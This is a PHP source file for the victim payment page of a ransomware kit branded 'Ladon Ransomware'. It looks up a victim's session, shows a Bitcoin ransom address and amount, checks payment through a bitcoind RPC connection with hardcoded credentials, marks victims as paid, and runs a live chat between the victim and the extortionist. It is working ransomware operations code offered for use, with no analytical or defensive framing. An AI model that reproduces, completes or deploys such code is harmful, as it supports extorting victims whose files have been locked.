<?php
require_once 'api/RPC/includes/jsonRPCClient.php'; 
$bitcoin = new jsonRPCClient('http://root:Dk7vob3KkkkpzvEm0n8KiMAyhE16nGx1RlObdAdhXjfJpntcUNwfEVO@127.0.0.1:8332/');
include_once("victims.php");
function usd2btc($usd){
$content = file_get_contents("https://bitpay.com/api/rates");
if($content){
    $price = json_decode($content, true)[1]["rate"];
    if($price != 0 && $usd != 0){
    return $usd / $price;
    }
    else{
        return "";
    }
}
else{
    return "";
}
}
$address = "";
$amount = "";
$contactid = $session;
$statuz = "unpaid";

	$paiz = "paid";

                                                $useraddress = "SELECT * FROM `ransomware` WHERE `contactid` = :contactid";
                                                if($sth = $db->prepare($useraddress)){
                                                    $sth->bindParam(":contactid", $session);
                                                    $sth->execute();
                                                    if($sth->rowCount() > 0 ){
                                                            
                                                        while( $row = $sth->fetch(PDO::FETCH_ASSOC) ) {
                                                            $address = "<input type='text' class='form-control' readonly='' value='".$row["address"]."'>";
                                                            $amount = "<input type='text' class='form-control' readonly='' value='".$row["amount"]."'>";


		if($row["paid"] == $paiz){
				$statuz = "Paid";
		}

		else if($bitcoin->getreceivedbyaddress($row["address"]) >= usd2btc($row["amount"])){
			
            $udp = "UPDATE `ransomware` SET `paid` = :paid WHERE `contactid` = :contactid";
            if($sth = $db->prepare($udp)){
                $sth->bindParam(":paid", $paiz);
                $sth->bindParam(":contactid", $session);
                $sth->execute();
            
            		$statuz = "Paid";
			}
		}
		else{
				$statuz = "Unpaid";
			}

       		}
        }
    }


?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
        <meta name="description" content="">
        <meta name="keyword" content="">

        <title>Ladon Ransomware</title>

        <link href="assets/css/bootstrap.min.css" rel="stylesheet">
        <link href="assets/css/slidebars.min.css" rel="stylesheet">
        <link href="assets/css/icons.css" rel="stylesheet">
        <link href="assets/css/menu.css" rel="stylesheet" type="text/css">
        <link href="assets/css/style.css" rel="stylesheet">
    </head>

    <body class="sticky-header">
        <section>
            <!-- sidebar left start-->
            <div class="sidebar-left">
                <div class="sidebar-left-info">
  
                                        
                    <!--sidebar nav start-->
                    <ul class="side-navigation">
                        <li class="active">
                            <a href="victimindex.php"><span>Main</span></a>
                        </li>
                       
                    </ul><!--sidebar nav end-->
                </div>
            </div><!-- sidebar left end-->

            <!-- body content start-->
            <div class="body-content">
                <!-- header section start-->
                <div class="header-section">
                    <!--logo and logo icon start-->
                    <div class="logo">
                        <a href="index.php">
                            <!--<i class="fa fa-maxcdn"></i>-->
                            <span class="brand-name">LADON RANSOMWARE</span>
                        </a>
                    </div>

                    <!--toggle button start-->
                    <a class="toggle-btn"><i class="ti ti-menu"></i></a>
                    <!--toggle button end-->

                  

                </div>
                <!-- header section end-->

                <div class="container-fluid">
                    <div class="page-head">
                        <h4 class="mt-2 mb-2">Main</h4>
                    </div>
                     <div class="row">
                        <div class="col-lg-12 col-sm-12">
                            <div class="card m-b-30">
                                <div class="card-body">
                                    <h1 class="header-title pb">Payment Status?: <?php echo $statuz; ?></h1>           
                                              
                                </div>
                            </div>
                        </div>
                    </div>    

                    <div class="row">
                        <div class="col-lg-12 col-sm-12">
                            <div class="card m-b-30">
                                <div class="card-body">
                                    <h5 class="header-title pb-3">Pay Here</h5>           
                                    <div class="row">
                                        <div class="col-sm-12">
                                            <div class="form-group">
                                                <label for="exampleInputEmail1">Bitcoin Address</label>
                                                <?php
                                                echo $address;
                                                ?>
                                            </div>
                                            <div class="form-group">
                                                <label for="exampleInputEmail1">Bitcoin Amount To Send</label>
                                            <?php
                                                    echo $amount;
                                                    ?>
                                            </div>
                                        </div>
                                    </div>              
                                </div>
                            </div>
                        </div>
                    </div>    


                    <div class="row">
                        <div class="col-lg-12 col-sm-12">
                            <div class="card m-b-30">
                                <div class="card-body">
                                    <h5 class="header-title pb-3">Chatting with Admin</h5>           
                                    <div class="row">
                                        <div class="col-sm-12">

                                            <div class="form-group row">
                                                <div class="col-md-12">
                                                    <textarea id="chat" class="form-control" rows="10" readonly=""></textarea>
                                                    <div class="input-group mt-2">
                                                        <input type="email" id="messagez" class="form-control" placeholder="Message">
                                                        <span class="input-group-append">
                                                        <button type="button" id="sendmsg" class="btn  btn-primary">Send Message</button>
                                                        </span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>              
                                </div>
                            </div>
                        </div>
                    </div>    





                    
                </div><!--end container-->

                <!--footer section start-->
                <footer class="footer">
                    LANDON RANSOMWARE
                </footer>
                <!--footer section end-->


            </div>
            <!--end body content-->
        </section>


        <script src="assets/js/jquery-3.2.1.min.js"></script>
        <script src="assets/js/bootstrap.min.js"></script>
        <script src="assets/js/jquery-migrate.js"></script>
        <script src="assets/js/jquery.slimscroll.min.js"></script>

<script>
    function post(){
        var messagez = $("#messagez").val();
            $.post('victimdata.php?comment=<?php echo $contactid; ?>', { message : messagez }, function(data) {
                            $("#messagez").val("");
                        });
        }
        $(document).keypress(function(e) {
        var keycode = (e.keyCode ? e.keyCode : e.which);
            if (keycode == '13') {
                post();
            }
        });
        $("#sendmsg").click(function(){
            post();
        });
        setInterval(function () {
            $.ajax({
                url: 'victimdata.php?chat=<?php echo $contactid; ?>',
                type:"GET",
                success: function (resp) {
                    try{
                        $('#chat').empty().append(resp);
                    }catch(e){

                    }
                    
                }
            });
        }, 1000);

</script>

    </body>
</html>
